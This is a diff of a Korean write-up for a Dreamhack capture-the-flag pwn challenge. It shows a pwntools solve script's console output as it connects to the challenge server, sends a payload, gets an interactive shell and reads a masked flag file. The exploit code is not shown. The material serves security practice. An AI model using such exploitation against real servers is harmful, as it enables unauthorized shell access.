@@ -85,11 +85,12 @@ r.interactive()
 
 pwntools로 페이로드를 Input: 에 보내보았다
 ----------------------------------------------------------------------------------------
-## 결과
+# 결과
 
+```console
 jjang@wjw:/mnt/c/Users/jjang/Downloads/08861c22-4c49-4a28-988f-297575aa6837$ python3 solve.py
 [+] Opening connection to host3.dreamhack.games on port 9633: Done
-/mnt/c/Users/jjang/Downloads/08861c22-4c49-4a28-988f-297575aa6837/solve.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+/mnt/c/Users/jjang/Downloads/08861c22-4c49-4a28-988f-297575aa6837/solve.py:9: BytesWarning: Text is not bytes; assuming ASCII, no guarantees.
   r.recvuntil('Input: ')
 [*] Switching to interactive mode
 $ ls
@@ -99,4 +100,5 @@ run.sh
 $ cat flag
 DH{□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□□}
 $
+```
 ----------------------------------------------------------------------------------------
